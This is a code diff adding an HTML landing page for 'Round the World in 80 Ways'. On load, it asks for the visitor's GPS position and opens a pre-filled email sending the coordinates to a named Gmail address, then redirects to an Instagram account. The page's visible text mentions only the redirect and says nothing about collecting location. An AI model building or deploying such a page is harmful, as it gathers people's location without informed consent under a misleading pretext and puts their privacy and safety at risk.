@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture GPS & Redirect</title>
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+                    let email = "notify.dr.lambros@gmail.com";  // Replace with your email
+                    let subject = "User GPS Location";
+                    let body = `User's Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+
+                    // Create mailto link
+                    let mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+
+                    // Open email client
+                    window.location.href = mailtoLink;
+
+                    // Redirect after a short delay
+                    setTimeout(function () {
+                        window.location.href = "https://www.instagram.com/roundtheworldin80ways?igsh=MWJzeGE0MHppaXdnZw%3D%3D&utm_source=qr"; // Replace with your Instagram link
+                    }, 3000);
+                }, function (error) {
+                    alert("Error getting location: " + error.message);
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+    </script>
+</head>
+<body onload="sendLocation()">
+    <h1>Round the World in 80 Ways - forwarding to our Instagram...</h1>
+</body>
+</html>
